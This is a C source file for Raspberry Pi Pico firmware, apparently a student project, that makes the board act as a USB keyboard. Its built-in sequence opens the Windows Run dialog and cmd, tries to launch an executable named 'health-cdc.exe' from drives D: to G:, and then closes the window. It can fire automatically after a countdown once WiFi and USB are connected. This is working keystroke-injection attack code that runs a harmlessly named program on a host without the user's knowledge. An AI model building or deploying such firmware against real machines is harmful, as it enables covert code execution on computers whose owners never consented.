/**
 * @file    hid_manager.c
 * @brief   HID keyboard sequence management implementation
 * @author  Team IS-02
 * @date    2025-11-08
 */

/*******************************************************************************
 * INCLUDES
 ******************************************************************************/
#include "hid_manager.h"
#include "hid_config.h"
#include "pico/stdlib.h"
#include "hardware/gpio.h"
#include "tusb.h"
#include <stdio.h>
#include <string.h>

/*******************************************************************************
 * PRIVATE VARIABLES
 ******************************************************************************/
static hid_manager_state_t g_hid_state = {0};
static hid_config_t g_hid_config = {0};
static hid_key_action_t g_sequence[HID_MAX_SEQUENCE_LENGTH] = {0};

/*******************************************************************************
 * PRIVATE FUNCTION PROTOTYPES
 ******************************************************************************/
static void hid_check_manual_trigger(void);
static void hid_check_auto_trigger(bool wifi_connected, bool usb_mounted);
static void hid_execute_sequence(void);

/*******************************************************************************
 * PUBLIC FUNCTION IMPLEMENTATIONS
 ******************************************************************************/

/**
 * @brief Initialize HID manager
 */
bool hid_manager_init(const hid_config_t *config)
{
    if (config == NULL)
    {
        printf("HID Manager: ERROR - Invalid configuration\n");
        return false;
    }
    
    printf("HID Manager: Initializing...\n");
    
    /* Store configuration */
    memcpy(&g_hid_config, config, sizeof(hid_config_t));
    
    /* Initialize state */
    memset(&g_hid_state, 0, sizeof(hid_manager_state_t));
    g_hid_state.status = HID_STATUS_IDLE;
    g_hid_state.is_running = false;
    g_hid_state.sequence_index = 0;
    g_hid_state.sequence_length = 0;
    g_hid_state.auto_trigger_executed = false;
    g_hid_state.auto_trigger_start_time = 0;
    
    /* Initialize trigger button if enabled */
    if (g_hid_config.enable_manual_trigger)
    {
        gpio_init(g_hid_config.trigger_button_pin);
        gpio_set_dir(g_hid_config.trigger_button_pin, GPIO_IN);
        gpio_pull_up(g_hid_config.trigger_button_pin);
        printf("HID Manager: Manual trigger enabled (GP%u)\n", 
               g_hid_config.trigger_button_pin);
    }
    
    if (g_hid_config.enable_auto_trigger)
    {
        g_hid_state.status = HID_STATUS_WAITING_TRIGGER;
        printf("HID Manager: Auto-trigger enabled (%lu ms delay)\n", 
               g_hid_config.auto_trigger_delay_ms);
    }
    
    printf("HID Manager: Initialized successfully\n");
    return true;
}

/**
 * @brief Build default keyboard sequence
 */
void hid_manager_build_sequence(void)
{
    printf("HID Manager: Building keyboard sequence...\n");
    
    hid_manager_clear_sequence();
    
    /* Open Run dialog (Win+R) and type "cmd" */
    hid_manager_add_key(KEYBOARD_MODIFIER_LEFTGUI, HID_KEY_R, 8);
    hid_manager_add_key(0, HID_KEY_C, 1);
    hid_manager_add_key(0, HID_KEY_M, 1);
    hid_manager_add_key(0, HID_KEY_D, 1);
    hid_manager_add_key(0, HID_KEY_ENTER, 60);  // Delay to Wait for CMD to open
    
    /* Try health-cdc.exe on multiple drive letters */
    char drives[] = "DEFG";
    for (int d = 0; d < 4; d++)
    {
        /* Type drive letter with colon (e.g., "D:") */
        hid_manager_add_key(KEYBOARD_MODIFIER_LEFTSHIFT, 
                           HID_KEY_A + (drives[d] - 'A'), 1);
        hid_manager_add_key(KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_SEMICOLON, 1);
        
        // Type "health-cdc.exe"
        hid_manager_add_key(0, HID_KEY_H, 1);
        hid_manager_add_key(0, HID_KEY_E, 0);
        hid_manager_add_key(0, HID_KEY_A, 0);
        hid_manager_add_key(0, HID_KEY_L, 0);
        hid_manager_add_key(0, HID_KEY_T, 0);
        hid_manager_add_key(0, HID_KEY_H, 0);
        hid_manager_add_key(KEYBOARD_MODIFIER_LEFTSHIFT, HID_KEY_MINUS, 0);
        hid_manager_add_key(0, HID_KEY_C, 0);
        hid_manager_add_key(0, HID_KEY_D, 0);
        hid_manager_add_key(0, HID_KEY_C, 0);
        hid_manager_add_key(0, HID_KEY_PERIOD, 0);
        hid_manager_add_key(0, HID_KEY_E, 0);
        hid_manager_add_key(0, HID_KEY_X, 0);
        hid_manager_add_key(0, HID_KEY_E, 1);
        hid_manager_add_key(0, HID_KEY_ENTER, 3);
    }
    
    /* Add delay between attempts */
    for (int i = 0; i < 15; i++)
    {
        hid_manager_add_key(0, 0, 0);  /* Delay frame */
    }
    
    /* Type "exit" to close CMD */
    hid_manager_add_key(0, HID_KEY_E, 4);
    hid_manager_add_key(0, HID_KEY_X, 4);
    hid_manager_add_key(0, HID_KEY_I, 4);
    hid_manager_add_key(0, HID_KEY_T, 4);
    hid_manager_add_key(0, HID_KEY_ENTER, 0);
    
    printf("HID Manager: Sequence built (%u actions)\n", g_hid_state.sequence_length);
}

/**
 * @brief Start HID sequence manually
 */
bool hid_manager_start_sequence(void)
{
    if (g_hid_state.is_running)
    {
        printf("HID Manager: Sequence already running\n");
        return false;
    }
    
    if (g_hid_state.sequence_length == 0)
    {
        // This should not happen if called after hid_manager_build_sequence in main
        printf("HID Manager: ERROR - No sequence built\n");
        return false;
    }
    
    printf("HID Manager: Starting sequence...\n");
    
    g_hid_state.is_running = true;
    g_hid_state.status = HID_STATUS_RUNNING;
    g_hid_state.sequence_index = 0;
    g_hid_state.last_update_time = to_ms_since_boot(get_absolute_time());
    
    return true;
}

/**
 * @brief Stop HID sequence
 */
void hid_manager_stop_sequence(void)
{
    if (g_hid_state.is_running)
    {
        printf("HID Manager: Stopping sequence\n");
        g_hid_state.is_running = false;
        g_hid_state.status = HID_STATUS_IDLE;
    }
}

/**
 * @brief HID task - main periodic task
 */
void hid_manager_task(bool wifi_connected, bool usb_mounted)
{
    /* Check auto-trigger conditions */
    if (g_hid_config.enable_auto_trigger && !g_hid_state.auto_trigger_executed)
    {
        hid_check_auto_trigger(wifi_connected, usb_mounted);
    }
    
    /* Check manual trigger button */
    if (g_hid_config.enable_manual_trigger && !g_hid_state.is_running)
    {
        hid_check_manual_trigger();
    }
    
    /* Execute sequence if running */
    if (g_hid_state.is_running)
    {
        hid_execute_sequence();
    }
}

/**
 * @brief Get current HID status
 */
hid_status_t hid_manager_get_status(void)
{
    return g_hid_state.status;
}

/**
 * @brief Get HID manager state
 */
const hid_manager_state_t *hid_manager_get_state(void)
{
    return &g_hid_state;
}

/**
 * @brief Check if sequence is running
 */
bool hid_manager_is_running(void)
{
    return g_hid_state.is_running;
}

/**
 * @brief Reset HID manager
 */
void hid_manager_reset(void)
{
    g_hid_state.is_running = false;
    g_hid_state.status = HID_STATUS_IDLE;
    g_hid_state.sequence_index = 0;
    g_hid_state.auto_trigger_executed = false;
    g_hid_state.auto_trigger_start_time = 0;
}

/**
 * @brief Add key action to sequence
 */
bool hid_manager_add_key(uint8_t modifier, uint8_t key, uint16_t delay_count)
{
    if (g_hid_state.sequence_length >= HID_MAX_SEQUENCE_LENGTH - 2)
    {
        printf("HID Manager: WARNING - Sequence buffer full\n");
        return false;
    }
    
    /* Add key press action */
    g_sequence[g_hid_state.sequence_length].modifier = modifier;
    g_sequence[g_hid_state.sequence_length].key = key;
    g_hid_state.sequence_length++;
    
    /* Add key release action */
    g_sequence[g_hid_state.sequence_length].modifier = 0;
    g_sequence[g_hid_state.sequence_length].key = 0;
    g_hid_state.sequence_length++;
    
    /* Add delay frames */
    for (uint16_t i = 0; i < delay_count && 
         g_hid_state.sequence_length < HID_MAX_SEQUENCE_LENGTH; i++)
    {
        g_sequence[g_hid_state.sequence_length].modifier = 0;
        g_sequence[g_hid_state.sequence_length].key = 0;
        g_hid_state.sequence_length++;
    }
    
    return true;
}

/**
 * @brief Clear keyboard sequence
 */
void hid_manager_clear_sequence(void)
{
    memset(g_sequence, 0, sizeof(g_sequence));
    g_hid_state.sequence_length = 0;
    g_hid_state.sequence_index = 0;
}

/**
 * @brief Get current sequence length
 */
uint16_t hid_manager_get_sequence_length(void)
{
    return g_hid_state.sequence_length;
}

/**
 * @brief Check if auto-trigger has executed
 */
bool hid_manager_auto_trigger_done(void)
{
    return g_hid_state.auto_trigger_executed;
}

/*******************************************************************************
 * PRIVATE FUNCTION IMPLEMENTATIONS
 ******************************************************************************/

/**
 * @brief Check manual trigger button
 */
static void hid_check_manual_trigger(void)
{
    static bool last_button_state = true;
    static uint32_t debounce_time = 0;
    
    bool current_state = gpio_get(g_hid_config.trigger_button_pin);
    uint32_t now = to_ms_since_boot(get_absolute_time());
    
    /* Button pressed (active low with pull-up) */
    if (!current_state && last_button_state)
    {
        /* Debounce check */
        if (now - debounce_time > HID_BUTTON_DEBOUNCE_MS)
        {
            printf("\n>>> GP%u Button Pressed! Starting HID sequence... <<<\n",
                   g_hid_config.trigger_button_pin);
            
            // Sequence should already be built from main.c
            // hid_manager_build_sequence(); 
            hid_manager_start_sequence();
            
            debounce_time = now;
        }
    }
    
    last_button_state = current_state;
}

/**
 * @brief Check auto-trigger conditions
 */
static void hid_check_auto_trigger(bool wifi_connected, bool usb_mounted)
{
    /* Both WiFi and USB must be ready */
    if (!wifi_connected || !usb_mounted)
    {
        // Reset countdown if conditions are no longer met
        g_hid_state.auto_trigger_start_time = 0;
        g_hid_state.status = HID_STATUS_WAITING_TRIGGER;
        return;
    }
    
    /* Start countdown timer only if not started yet and not running/complete */
    if (g_hid_state.auto_trigger_start_time == 0 && 
        g_hid_state.status == HID_STATUS_WAITING_TRIGGER)
    {
        g_hid_state.auto_trigger_start_time = to_ms_since_boot(get_absolute_time());
        printf("\n*** WIFI + USB READY - %lu second countdown started ***\n",
               g_hid_config.auto_trigger_delay_ms / 1000);
        return;
    }
    
    // Only proceed if countdown has started
    if (g_hid_state.auto_trigger_start_time == 0) {
        return;
    }
    
    /* Check if countdown completed */
    uint32_t now = to_ms_since_boot(get_absolute_time());
    uint32_t elapsed = now - g_hid_state.auto_trigger_start_time;
    
    if (elapsed >= g_hid_config.auto_trigger_delay_ms)
    {
        printf("*** AUTO-TRIGGERING HID SEQUENCE ***\n");
        
        // Sequence should already be built from main.c
        // hid_manager_build_sequence(); 
        hid_manager_start_sequence();
        
        g_hid_state.auto_trigger_executed = true;
        g_hid_state.status = HID_STATUS_RUNNING; // Status is set in start_sequence, but for clarity
    }
}

/**
 * @brief Execute keyboard sequence
 */
static void hid_execute_sequence(void)
{
    /* Check if TinyUSB HID is ready */
    if (!tud_hid_ready())
    {
        return;
    }
    
    /* Rate limit updates */
    uint32_t now = to_ms_since_boot(get_absolute_time());
    if (now - g_hid_state.last_update_time < HID_UPDATE_INTERVAL_MS)
    {
        return;
    }
    
    g_hid_state.last_update_time = now;
    
    /* Check if sequence complete */
    if (g_hid_state.sequence_index >= g_hid_state.sequence_length)
    {
        g_hid_state.is_running = false;
        g_hid_state.status = HID_STATUS_COMPLETE;
        printf("HID Manager: Sequence completed!\n\n");
        return;
    }
    
    /* Get current action */
    hid_key_action_t action = g_sequence[g_hid_state.sequence_index];
    g_hid_state.sequence_index++;
    
    /* Send HID report */
    uint8_t keycode[6] = {0};
    if (action.key != 0)
    {
        keycode[0] = action.key;
    }
    
    tud_hid_keyboard_report(REPORT_ID_KEYBOARD, action.modifier, keycode);
}

/*******************************************************************************
 * TinyUSB CALLBACK IMPLEMENTATIONS
 ******************************************************************************/

/**
 * @brief TinyUSB HID get report callback
 */
uint16_t tud_hid_get_report_cb(uint8_t itf, 
                               uint8_t report_id, 
                               uint8_t report_type, 
                               uint8_t* buffer, 
                               uint16_t reqlen)
{
    (void)itf;
    (void)report_id;
    (void)report_type;
    (void)buffer;
    (void)reqlen;
    
    return 0;
}

/**
 * @brief TinyUSB HID set report callback
 */
void tud_hid_set_report_cb(uint8_t itf, 
                           uint8_t report_id, 
                           uint8_t report_type, 
                           const uint8_t* buffer, 
                           uint16_t bufsize)
{
    (void)itf;
    (void)report_id;
    (void)report_type;
    (void)buffer;
    (void)bufsize;
}